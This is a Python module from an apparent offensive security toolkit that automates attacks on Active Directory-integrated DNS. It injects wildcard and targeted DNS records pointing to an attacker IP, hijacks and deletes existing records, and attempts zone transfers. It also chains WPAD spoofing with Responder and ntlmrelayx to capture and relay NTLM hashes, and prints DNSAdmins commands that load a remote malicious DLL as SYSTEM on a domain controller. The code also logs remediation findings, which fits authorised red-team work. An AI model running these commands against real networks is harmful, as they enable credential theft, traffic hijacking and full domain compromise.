"""
Module: AD-Integrated DNS (ADIDNS) Abuse
Techniques:
  - Wildcard DNS record injection (bypasses LLMNR/NBT-NS disable)
  - ADIDNS record CRUD (add/modify/delete A records)
  - DNS zone enumeration
  - WPAD via ADIDNS for NTLM capture
  - Persistent DNS poisoning
"""
from utils.helpers import *
from config.settings import SESSION
import shutil
from pathlib import Path

MENU = """
  ── AD-INTEGRATED DNS ABUSE ─────────────────────────────────────
  [1]  Enumerate DNS Zones & Records   (dnstool.py / LDAP / dig)
  [2]  Add Wildcard Record (*)         (redirect all unresolved → attacker)
  [3]  Add Specific A Record           (targeted DNS poisoning)
  [4]  WPAD via ADIDNS                 (NTLM capture from browsers)
  [5]  Modify Existing Record          (hijack a hostname)
  [6]  Delete DNS Record               (cleanup)
  [7]  DNS Zone Transfer               (dig axfr)
  [8]  DNSAdmins DLL Injection         (requires DNSAdmins membership)
  [0]  Back
"""

def _dnstool():
    for candidate in (
        shutil.which("dnstool.py"),
        Path(__file__).resolve().parent.parent / "tools" / "krbrelayx" / "dnstool.py",
        "/opt/krbrelayx/dnstool.py",
        "/usr/share/krbrelayx/dnstool.py",
    ):
        if candidate and Path(candidate).exists():
            return str(candidate)
    return ""


def _dnstool_cmd(dc, dom, user, pw, action, record, data="", rtype="A"):
    principal = f"{dom}\\{user}"
    tool = _dnstool()
    if not tool:
        warn("dnstool.py not found; ADIDNS record write/query actions need krbrelayx dnstool.py")
        type_arg = f" --type {rtype}" if rtype else ""
        data_arg = f" --data {data}" if data else ""
        print(f"""
  {Y}Install / locate dnstool.py:{RST}
    sudo git clone https://github.com/dirkjanm/krbrelayx /opt/krbrelayx
    # or without sudo:
    git clone https://github.com/dirkjanm/krbrelayx tools/krbrelayx
    # or place dnstool.py somewhere in PATH

  {Y}Manual command template:{RST}
    python3 dnstool.py -u '{dom}\\{user}' -p '<password>' --action {action.lower()} \\
      --record '{record}'{type_arg}{data_arg} {dc}
""")
        return ""

    cmd = (
        f"python3 {shell_quote(tool)} -u {shell_quote(principal)} "
        f"-p {shell_quote(pw)} --action {shell_quote(action.lower())} "
        f"--record {shell_quote(record)}"
    )
    if rtype:
        cmd += f" --type {shell_quote(rtype)}"
    if data:
        cmd += f" --data {shell_quote(data)}"
    cmd += f" {shell_quote(dc)}"
    return cmd


def _run_dnstool(dc, dom, user, pw, action, record, data="", rtype="A"):
    cmd = _dnstool_cmd(dc, dom, user, pw, action, record, data, rtype)
    if cmd:
        run_cmd(cmd)
        return True
    return False


def run():
    print_banner("ADIDNS ABUSE", "AD-Integrated DNS Wildcard & Record Injection")
    dc      = input_or_session("dc_ip",    "DC IP")
    dom     = input_or_session("domain",   "Domain")
    user    = input_or_session("username", "Username")
    pw      = input_or_session("password", "Password")
    attacker = input_or_session("attacker_ip", "Attacker IP")
    iface = SESSION.get("attacker_iface") or "<INTERFACE>"

    print(MENU)
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] Enumerate DNS ─────────────────────────────────────────────────────
    if c == "1":
        info("Enumerating AD-integrated DNS zones and records...")
        principal = f"{user}@{dom}"
        _run_dnstool(dc, dom, user, pw, "query", dom, rtype="")
        run_cmd(
            f"ldapsearch -x -H ldap://{shell_quote(dc)} "
            f"-D {shell_quote(principal)} -w {shell_quote(pw)} "
            f"-b {shell_quote('CN=MicrosoftDNS,DC=DomainDnsZones,' + 'DC=' + dom.replace('.', ',DC='))} "
            f"'(objectClass=dnsNode)' name dNSTombstoned",
            timeout=60,
        )
        run_cmd(f"dig axfr @{dc} {dom}")
        run_cmd(f"nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain={shell_quote(dom)} {shell_quote(dc)}")

    # ── [2] Wildcard wildcard record ──────────────────────────────────────────
    elif c == "2":
        print(f"""
  {NEON_CYN}ADIDNS Wildcard Injection — Persistent LLMNR bypass:{RST}
  {DIM}Creates a * DNS record pointing to attacker.
  All unresolvable hostnames will now resolve to {attacker}.
  More persistent than Responder — survives reboots, works even when
  LLMNR/NBT-NS is disabled, legitimate DNS traffic.{RST}
""")
        _run_dnstool(dc, dom, user, pw, "add", "*", attacker)
        # Alternative: Invoke-DNSUpdate
        print(f"""
  {NEON_CYN}Verify injection:{RST}
  nslookup doesnotexist.{dom} {dc}
  # Should resolve to {attacker}

  {NEON_CYN}Start capture (after wildcard is in place):{RST}
  sudo responder -I {iface} -A  # Passive — just capture, don't poison
  sudo {imp('ntlmrelayx.py')} -tf /tmp/targets.txt -smb2support
""")
        add_finding("ADIDNS Wildcard Record Injected", "High",
                    f"Wildcard DNS record * → {attacker} injected into AD DNS",
                    "Monitor DNS record creation (Event 770); restrict ADIDNS write permissions")

    # ── [3] Add specific A record ─────────────────────────────────────────────
    elif c == "3":
        hostname = prompt("Hostname to inject (e.g. wpad, fileserver)")
        _run_dnstool(dc, dom, user, pw, "add", hostname, attacker)
        info(f"DNS: {hostname}.{dom} → {attacker}")
        info(f"Verify: nslookup {hostname}.{dom} {dc}")

    # ── [4] WPAD via ADIDNS ───────────────────────────────────────────────────
    elif c == "4":
        print(f"""
  {NEON_CYN}WPAD ADIDNS Attack Chain:{RST}
  {DIM}1. Inject wpad.{dom} → {attacker}
  2. Serve fake WPAD file that points browser proxy → {attacker}
  3. Capture NTLM hashes from all browsers that auto-detect proxy
  4. Relay to LDAP/SMB or crack offline{RST}

  ── Step 1: Inject WPAD record ───────────────────────────────────────────
""")
        _run_dnstool(dc, dom, user, pw, "add", "wpad", attacker)
        print(f"""
  ── Step 2: Start Responder (WPAD + capture) ─────────────────────────────
  sudo responder -I {iface} --wpad

  ── Step 3 (optional): Relay to LDAP ─────────────────────────────────────
  sudo {imp('ntlmrelayx.py')} -t ldap://{dc} -smb2support --wpad-host {attacker} \\
    --add-computer --delegate-access

  ── Cleanup ──────────────────────────────────────────────────────────────
  python3 dnstool.py -u '{dom}\\{user}' -p '<password>' --action remove \\
    --record 'wpad' {dc}
""")
        add_finding("WPAD via ADIDNS", "High",
                    "WPAD DNS record injected — browser proxy auth capture possible",
                    "Disable WPAD via GPO; block ADIDNS write for standard users")

    # ── [5] Modify existing record ────────────────────────────────────────────
    elif c == "5":
        hostname = prompt("Target hostname to hijack")
        _run_dnstool(dc, dom, user, pw, "modify", hostname, attacker)
        info(f"Modified: {hostname} → {attacker}")
        add_finding("ADIDNS Record Hijacked", "High",
                    f"DNS record for {hostname} modified to point to attacker IP",
                    "Audit DNS record modifications; restrict ADIDNS ACLs")

    # ── [6] Delete record ─────────────────────────────────────────────────────
    elif c == "6":
        hostname = prompt("Record to delete")
        _run_dnstool(dc, dom, user, pw, "remove", hostname, rtype="")
        success(f"Deleted DNS record: {hostname}")

    # ── [7] Zone transfer ─────────────────────────────────────────────────────
    elif c == "7":
        run_cmd(f"dig axfr @{dc} {dom}")
        run_cmd(f"dig axfr @{dc} _msdcs.{dom}")

    # ── [8] DNSAdmins DLL injection ───────────────────────────────────────────
    elif c == "8":
        dll_path = prompt("UNC path to malicious DLL (e.g. \\\\attacker_ip\\share\\evil.dll)")
        print(f"""
  {NEON_CYN}DNSAdmins DLL Injection — requires DNSAdmins group membership:{RST}
  {DIM}DNS service loads the DLL on restart/reload — runs as SYSTEM on DC.{RST}

  ── Configure plugin ─────────────────────────────────────────────────────
  dnscmd {dc} /config /serverlevelplugindll {dll_path}

  ── Trigger load (restart DNS service) ───────────────────────────────────
  sc \\{dc} stop dns
  sc \\{dc} start dns

  ── Linux alternative ─────────────────────────────────────────────────────
  nxc smb {dc} -u '{user}' -p '{pw}' -d {dom} \\
    -x 'dnscmd /config /serverlevelplugindll {dll_path}'
  nxc smb {dc} -u '{user}' -p '{pw}' -d {dom} \\
    -x 'sc stop dns && sc start dns'

  ── Cleanup ──────────────────────────────────────────────────────────────
  dnscmd {dc} /config /serverlevelplugindll ""
""")
        add_finding("DNSAdmins DLL Injection", "Critical",
                    "DNSAdmins membership allows SYSTEM-level code execution on DC via DNS plugin",
                    "Remove unnecessary DNSAdmins memberships; monitor plugin DLL config changes")

    pause()
